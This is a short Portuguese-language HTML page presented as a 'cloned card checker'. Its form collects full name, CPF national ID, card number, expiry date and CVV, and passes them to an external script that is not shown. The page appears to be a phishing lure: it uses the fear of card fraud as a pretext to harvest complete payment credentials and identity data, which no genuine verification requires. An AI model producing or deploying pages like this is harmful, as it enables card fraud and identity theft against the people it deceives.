<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificador de Cartão Clonado ⚠️</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>Verificador de Cartão Clonado ⚠️</h2>
    <form id="cardForm">
      <label for="nome">Nome Completo:</label>
      <input type="text" id="nome" name="nome" required maxlength="100">
      
      <label for="cpf">CPF:</label>
      <input type="text" id="cpf" name="cpf" required maxlength="14" placeholder="000.000.000-00">
  
      <label for="numero_cartao">Número do Cartão:</label>
      <input type="text" id="numero_cartao" name="numero_cartao" required maxlength="19" placeholder="0000 0000 0000 0000">
  
      <label for="validade">Validade (MM/AA):</label>
      <input type="text" id="validade" name="validade" required maxlength="5" placeholder="MM/AA">
  
      <label for="cvv">CVV:</label>
      <input type="password" id="cvv" name="cvv" required maxlength="4" placeholder="***">
  
      <button type="submit">Verificar</button>
    </form>
    <div id="responseMessage" class="message"></div>
  </div>

  <script src="script.js"></script>
</body>
</html>
